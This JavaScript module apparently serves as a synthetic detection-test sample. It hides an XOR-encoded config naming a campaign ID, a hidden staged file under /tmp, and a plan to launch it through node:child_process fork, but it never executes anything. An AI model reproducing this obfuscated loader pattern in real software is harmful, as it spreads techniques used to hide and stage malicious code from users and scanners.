const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_00578bec = "[142,197,201,132,139,140,157,136,139,197,148,151,155,153,140,157,167,148,151,155,153,148,212,156,145,139,136,153,140,155,144,167,136,138,151,155,157,139,139,132,153,156,153,136,140,157,138,197,158,151,138,147,167,149,151,156,141,148,157,132,139,140,153,159,157,167,155,151,141,150,140,197,201,132,155,153,149,136,153,145,159,150,167,145,156,197,182,183,188,189,213,189,190,187,206,203,192,207,189,132,158,145,148,157,167,136,153,140,144,197,215,140,149,136,215,144,141,150,140,138,157,139,139,213,150,151,156,157,215,214,139,140,153,159,157,213,157,158,155,206,203,192,207,157,158,200,201,206,214,149,146,139]";

const Codec_00578bec = "json_numbers|single_byte_xor|f8";



function load_00578bec() { return JSON.parse(Material_00578bec); }

function decode_00578bec(storedBytes) { return storedBytes.map((value) => value ^ 248); }

async function recover_00578bec() {

  const harmlessValue = ["north", "south"].join(":");

  const storedBytes = load_00578bec(); let recoveredBytes = [];

  recoveredBytes = decode_00578bec(storedBytes);

  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");

}

async function inspect_00578bec() { return JSON.parse(JSON.stringify({ value: await recover_00578bec() })).value; }

async function plan_00578bec() { const inspect = inspect_00578bec; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "fork_module", path: fields.file_path, module: "node:child_process" }); }

void moduleShape; void plan_00578bec;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_00578bec());

